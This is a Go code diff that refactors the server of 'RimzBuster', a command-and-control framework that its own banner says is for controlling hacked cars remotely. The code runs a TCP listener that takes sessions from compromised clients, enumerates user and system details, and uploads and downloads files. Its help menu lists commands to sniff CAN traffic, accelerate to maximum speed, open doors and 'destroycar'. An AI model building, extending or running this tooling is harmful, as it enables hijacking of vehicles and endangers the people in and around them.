@@ -12,10 +12,14 @@ import (
 	"strings"
 	"sync"
 	"time"
-	"github.com/faiface/beep"
-	"github.com/faiface/beep/speaker"
-	"github.com/faiface/beep/mp3"
+
 	"github.com/olekukonko/tablewriter"
+	enum "github.com/vengeance1337/RimzBuster-C2/Enum"
+	"github.com/vengeance1337/RimzBuster-C2/banner"
+	"github.com/vengeance1337/RimzBuster-C2/download"
+	"github.com/vengeance1337/RimzBuster-C2/help"
+	"github.com/vengeance1337/RimzBuster-C2/media"
+	"github.com/vengeance1337/RimzBuster-C2/upload"
 )
 
 type Session struct {
@@ -35,74 +39,15 @@ var (
 )
 
 func main() {
-    printBanner()
+    banner.PrintBanner()
     audioFilePath := filepath.Join("..", "media", "f1.mp3")
-    if err := playAudio(audioFilePath); err != nil {
+    if err := media.PlayAudio(audioFilePath); err != nil {
         log.Fatalf("Failed to play audio: %v", err)
     }
 	log.Println("[+] Starting RimzBuster server...")
 	startServer(":8080")
 }
 
-func playAudio(filePath string) error {
-    f, err := os.Open(filePath)
-    if (err != nil) {
-        return err
-    }
-    defer f.Close()
-
-    streamer, format, err := mp3.Decode(f)
-    if (err != nil) {
-        return err
-    }
-    defer streamer.Close()
-
-    speaker.Init(format.SampleRate, format.SampleRate.N(time.Second/6))
-    done := make(chan bool)
-    speaker.Play(beep.Seq(streamer, beep.Callback(func() {
-        done <- true
-    })))
-    <-done
-    return nil
-}
-
-func printBanner() {
-
-    	// ANSI escape code for light red color
-	lightRed := "\033[91m"
-	// ANSI escape code to reset color
-	reset := "\033[0m"
-
-	fmt.Println(lightRed +`
-
-    ██████╗ ██╗███╗   ███╗███████╗██████╗ ██╗   ██╗███████╗████████╗███████╗██████╗
-    ██╔══██╗██║████╗ ████║╚══███╔╝██╔══██╗██║   ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗
-    ██████╔╝██║██╔████╔██║  ███╔╝ ██████╔╝██║   ██║███████╗   ██║   █████╗  ██████╔╝
-    ██╔══██╗██║██║╚██╔╝██║ ███╔╝  ██╔══██╗██║   ██║╚════██║   ██║   ██╔══╝  ██╔══██╗
-    ██║  ██║██║██║ ╚═╝ ██║███████╗██████╔╝╚██████╔╝███████║   ██║   ███████╗██║  ██║
-    ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚══════╝╚═════╝  ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
-
-                                     d88b
-                     _______________|8888|_______________
-                    |_____________ ,~~~~~~. _____________|
-                    |_____________: mmmmmm :_____________|
-  _______    ,----|~~~~~~~~~~~,,_...._..~~~~~~~~~~~|----,------,   _______
-|         |  |    |         |_____,d~    ~b.|____|       |    |  |         |
-|         |-------------------d.-~~~~~~-.b-/-------------------| |         |
-|         | |8888 ....... _,===~/......... ~===._         8888|  |         |
-|         |=========_,===~~======._.=~~=._.======~~===._=========|         |
-|         | |888===~~ ...... //,, .~~~~'. .,          ~~===888|  |         |
-|         |===================,P'.::::::::.. ?===================|         |
-|         |_________________,P'_:----------.._?,_________________|         |
-|         |-------------------~~~~~~~~~~~~~~~~~~---------------- |         |
-  _______/                                                       \_________/
-
-𝙰 𝙲𝚘𝚖𝚖𝚊𝚗𝚍 𝚊𝚗𝚍 𝙲𝚘𝚗𝚝𝚛𝚘𝚕 𝙵𝚛𝚊𝚖𝚎𝚠𝚘𝚛𝚔 𝚝𝚘 𝚌𝚘𝚗𝚝𝚛𝚘𝚕 𝚑𝚊𝚌𝚔𝚎𝚍 𝚌𝚊𝚛𝚜 𝚛𝚎𝚖𝚘𝚝𝚎𝚕𝚢.
-
-                                            𝙱𝚞𝚒𝚕𝚝 𝚋𝚢: 𝚅𝚊𝚕𝚎𝚛𝚒𝚊𝚗 𝙶𝚛𝚒𝚏𝚏𝚒𝚝𝚑𝚜
-                                            𝙶𝚒𝚝𝚑𝚞𝚋: 𝚑𝚝𝚝𝚙𝚜://𝚐𝚒𝚝𝚑𝚞𝚋.𝚌𝚘𝚖/𝚟𝚎𝚗𝚐𝚎𝚊𝚗𝚌𝚎
-  `+ reset)
-}
 
 func startServer(address string) {
 	listener, err := net.Listen("tcp", address)
@@ -121,8 +66,8 @@ func startServer(address string) {
 		}
 
 		go func(conn net.Conn) {
-			username := getUsername(conn)
-			osInfo := getOSInfo(conn)
+			username := enum.GetUsername(conn)
+			osInfo := enum.GetOSInfo(conn)
 			timeZone := getTimeZone(conn)
 			localTime := getLocalTime(conn)
 
@@ -143,21 +88,6 @@ func startServer(address string) {
 		}(conn)
 	}
 }
-
-func getUsername(conn net.Conn) string {
-	conn.Write([]byte("whoami\n"))
-	reader := bufio.NewReader(conn)
-	username, _ := reader.ReadString('\n')
-	return strings.TrimSpace(username)
-}
-
-func getOSInfo(conn net.Conn) string {
-	conn.Write([]byte("osinfo\n"))
-	reader := bufio.NewReader(conn)
-	osInfo, _ := reader.ReadString('\n')
-	return strings.TrimSpace(osInfo)
-}
-
 func getTimeZone(conn net.Conn) string {
 	conn.Write([]byte("timezone\n"))
 	return readCompleteResponse(conn)
@@ -167,7 +97,6 @@ func getLocalTime(conn net.Conn) string {
 	conn.Write([]byte("localtime\n"))
 	return readCompleteResponse(conn)
 }
-
 func handleSession(s *Session) {
 	defer func() {
 		s.Conn.Close()
@@ -197,7 +126,7 @@ func handleSession(s *Session) {
 		}
 
 		if command == "help" {
-			showHelp()
+			help.ShowHelp()
 			continue
 		}
 
@@ -250,54 +179,6 @@ func listSessions() {
 	table.Render()
 }
 
-func showHelp() {
-	fmt.Println(`
-+----------------------------------------------------------+
-|                  🏎️ RIMZBUSTER COMMANDS                  |
-+------------------------------------------+---------------+
-| Commands🥷                               | Description   |
-+------------------------------------------+---------------+
-| help                                     | Help menu     |
-|..........................................|...............|
-| sessions -l                              | List clients  |
-|..........................................|...............|
-| sessions -i <sessionID>                  | Choose client |
-|..........................................|...............|
-| exit                                     | Exit C2       |
-+------------------------------------------+---------------+
-| In-session Commands😈                    | Description   |
-+------------------------------------------+---------------+
-| upload <localpath> <remotedir>           | Upload a file |
-|..........................................|...............|
-| download <remotepath> <localpath>        | Download file |
-|..........................................|...............|
-| exit                                     | Exit session  |
-+------------------------------------------+---------------+
-| sniff                                    | Receive CAN   |
-|                                          | Packet dump   |
-|..........................................|...............|
-| accelerate                               | Increase speed|
-|                                          | to maximum    |
-|..........................................|...............|
-| rightsignal                              | Turn Right    |
-|                                          | Indicator On  |
-|..........................................|...............|
-| leftsignal                               | Turn Left     |
-|                                          | Indicator On  |
-|..........................................|...............|
-| hazard                                   | Turn Hazard   |
-|                                          | Lights On     |
-|..........................................|...............|
-| dooropen                                 | Opens all     |
-|                                          | Doors         |
-|..........................................|...............|
-| doorclose                                | Closes all    |
-|                                          | Doors         |
-|..........................................|...............|
-| destroycar                               | All Combined  |
-+------------------------------------------+---------------+`)
-}
-
 func interactWithSession(s *Session) {
 	reader := bufio.NewReader(os.Stdin)
 	for {
@@ -324,7 +205,7 @@ func interactWithSession(s *Session) {
 				fmt.Println("[!] Usage: upload <localpath> <remotedir>")
 				continue
 			}
-			err := uploadFile(s.Conn, filePaths[0], filePaths[1])
+			err := upload.UploadFile(s.Conn, filePaths[0], filePaths[1])
 			if err != nil {
 				fmt.Printf("[-] Error uploading file: %v\n", err)
 			} else {
@@ -340,7 +221,7 @@ func interactWithSession(s *Session) {
 				fmt.Println("[!] Usage: download <remotepath> <localpath>")
 				continue
 			}
-			err := downloadFile(s.Conn, filePaths[0], filePaths[1])
+			err := download.DownloadFile(s.Conn, filePaths[0], filePaths[1])
 			if err != nil {
 				fmt.Printf("[-] Error downloading file: %v\n", err)
 			} else {
@@ -365,7 +246,7 @@ func interactWithSession(s *Session) {
             wg.Add(1)
             go func() {
                 defer wg.Done()
-                if err := playAudio(audioFilePath); err != nil {
+                if err := media.PlayAudio(audioFilePath); err != nil {
                     fmt.Printf("Error playing audio: %v\n", err)
                 }
             }()
@@ -415,81 +296,6 @@ func interactWithSession(s *Session) {
 			fmt.Println(response)
 		}
 	}
-}
-
-func uploadFile(conn net.Conn, localPath string, remoteDir string) error {
-	file, err := os.Open(localPath)
-	if err != nil {
-		return err
-	}
-	defer file.Close()
-
-	// Extract the file name from the local path
-	fileName := filepath.Base(localPath)
-	remotePath := filepath.Join(remoteDir, fileName)
-
-	conn.Write([]byte(fmt.Sprintf("upload %s\n", remotePath)))
-
-	buf := make([]byte, 1024)
-	for {
-		n, err := file.Read(buf)
-		if err != nil && err != io.EOF {
-			return err
-		}
-		if n == 0 {
-			break
-		}
-		conn.Write(buf[:n])
-	}
-
-	conn.Write([]byte("EOF\n"))
-	return nil
-}
-
-func downloadFile(conn net.Conn, remotePath string, localPath string) error {
-	// Determine the final file path
-	var finalPath string
-	if stat, err := os.Stat(localPath); err == nil && stat.IsDir() {
-		// If localPath is a directory, append the file name from remotePath
-		fileName := filepath.Base(remotePath)
-		finalPath = filepath.Join(localPath, fileName)
-	} else {
-		// If localPath is a file path, use it as is
-		finalPath = localPath
-	}
-
-	// Send the download request to the client
-	conn.Write([]byte(fmt.Sprintf("download %s\n", remotePath)))
-
-	file, err := os.Create(finalPath)
-	if err != nil {
-		return fmt.Errorf("failed to create file: %v", err)
-	}
-	defer file.Close()
-
-	buf := make([]byte, 1024)
-	for {
-		n, err := conn.Read(buf)
-		if err != nil {
-			if err == io.EOF {
-				break
-			}
-			return fmt.Errorf("failed to receive file: %v", err)
-		}
-
-		content := string(buf[:n])
-		if strings.Contains(content, "EOF\n") {
-			content = strings.Replace(content, "EOF\n", "", 1)
-			if len(content) > 0 {
-				file.Write([]byte(content))
-			}
-			break
-		}
-
-		file.Write(buf[:n])
-	}
-
-	return nil
 }
 
 func readCompleteResponse(conn net.Conn) string {
